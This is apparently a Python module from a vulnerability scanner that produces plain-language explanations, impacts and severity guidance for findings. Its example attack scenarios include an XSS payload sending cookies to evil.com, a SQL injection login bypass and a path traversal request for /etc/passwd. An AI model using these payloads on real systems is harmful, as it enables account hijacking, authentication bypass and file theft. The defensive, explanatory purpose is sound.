"""
VulnScanX - AI Vulnerability Explainer
Generates human-readable explanations and remediation guidance.
"""
from core.models import Finding
from core.config import Severity


EXPLANATION_TEMPLATES = {
    "SQL Injection": {
        "what": (
            "SQL Injection occurs when an attacker inserts malicious SQL code into a query, "
            "tricking the database into executing unintended commands. This can lead to "
            "unauthorized data access, modification, or complete database takeover."
        ),
        "impact": [
            "Extract all data from the database (usernames, passwords, PII)",
            "Modify or delete database records",
            "Bypass authentication entirely",
            "In some cases, execute OS commands via xp_cmdshell (MSSQL)",
        ],
        "attack_scenario": (
            "Attacker enters `' OR '1'='1` in a login form. The application builds "
            "the query as `SELECT * FROM users WHERE username='' OR '1'='1'`, "
            "which always returns true, bypassing authentication."
        ),
    },
    "Cross-Site Scripting": {
        "what": (
            "XSS allows attackers to inject malicious JavaScript into web pages viewed "
            "by other users. The browser trusts the script because it appears to come "
            "from the legitimate website."
        ),
        "impact": [
            "Steal session cookies and hijack accounts",
            "Redirect users to phishing pages",
            "Log keystrokes including passwords",
            "Perform actions on behalf of the victim",
            "Deliver malware through drive-by downloads",
        ],
        "attack_scenario": (
            "Attacker posts `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` "
            "in a comment. Every user who views the page has their session cookie stolen."
        ),
    },
    "Path Traversal": {
        "what": (
            "Path traversal allows attackers to access files outside the web root directory "
            "by manipulating file path variables with sequences like `../`. This exposes "
            "sensitive system files."
        ),
        "impact": [
            "Read /etc/passwd exposing system users",
            "Access application config files with credentials",
            "Read source code revealing further vulnerabilities",
            "In write-vulnerable cases, modify system files",
        ],
        "attack_scenario": (
            "Application loads files via `?page=home.php`. Attacker requests "
            "`?page=../../../../etc/passwd` and retrieves system user list."
        ),
    },
    "Security Misconfiguration": {
        "what": (
            "Security misconfiguration results from insecure default configurations, "
            "incomplete setups, or overly permissive settings. It is the most common "
            "vulnerability class and often trivially exploitable."
        ),
        "impact": [
            "Unauthorized access to admin interfaces",
            "Exposure of sensitive data through error messages",
            "Vulnerability to known exploits on unpatched systems",
        ],
        "attack_scenario": (
            "Admin panel accessible without authentication at /admin. "
            "Attacker navigates directly to the URL and gains full control."
        ),
    },
    "Network Exposure": {
        "what": (
            "Unnecessary network services exposed to the internet increase the attack surface. "
            "Each open port is a potential entry point for attackers."
        ),
        "impact": [
            "Direct exploitation of service vulnerabilities",
            "Credential brute-forcing on exposed services",
            "Lateral movement within the network",
        ],
        "attack_scenario": (
            "RDP port 3389 exposed to internet. Attacker runs automated credential "
            "stuffing attack and gains Remote Desktop access."
        ),
    },
}

SEVERITY_CONTEXT = {
    Severity.CRITICAL: (
        "🚨 CRITICAL — Immediate action required. This vulnerability is likely "
        "remotely exploitable with no authentication required and can lead to "
        "complete system compromise. Patch within 24 hours."
    ),
    Severity.HIGH: (
        "🔴 HIGH — Urgent attention needed. This vulnerability can be exploited "
        "with minimal effort and causes significant damage. Patch within 7 days."
    ),
    Severity.MEDIUM: (
        "🟡 MEDIUM — Should be addressed in your next maintenance cycle. "
        "Exploitation requires specific conditions. Patch within 30 days."
    ),
    Severity.LOW: (
        "🔵 LOW — Minor issue. Patch as time permits. Low exploitation risk "
        "but contributes to overall security posture degradation."
    ),
    Severity.INFO: (
        "ℹ️  INFO — Informational finding. No direct exploit risk, "
        "but useful context for understanding the attack surface."
    ),
}


class VulnExplainer:
    """Generates structured human-readable explanations for findings."""

    def explain(self, finding: Finding) -> str:
        category = finding.category
        template = self._match_template(category)
        severity_ctx = SEVERITY_CONTEXT.get(finding.severity, "")

        parts = [f"[AI ANALYSIS — {finding.title}]", "", severity_ctx, ""]

        if template:
            parts.append(f"WHAT IS THIS VULNERABILITY?")
            parts.append(template["what"])
            parts.append("")
            parts.append("POTENTIAL IMPACT:")
            for impact in template["impact"]:
                parts.append(f"  • {impact}")
            parts.append("")
            parts.append("ATTACK SCENARIO:")
            parts.append(template["attack_scenario"])
        else:
            parts.append(finding.description)

        parts.append("")
        parts.append(f"CVSS SCORE: {finding.cvss_score}/10")
        if finding.cwe_id:
            parts.append(f"CWE: {finding.cwe_id} — https://cwe.mitre.org/data/definitions/{finding.cwe_id.replace('CWE-','')}.html")
        if finding.owasp:
            parts.append(f"OWASP: {finding.owasp}")

        return "\n".join(parts)

    def _match_template(self, category: str) -> dict:
        category_lower = category.lower()
        for key, template in EXPLANATION_TEMPLATES.items():
            if key.lower() in category_lower:
                return template
        return None
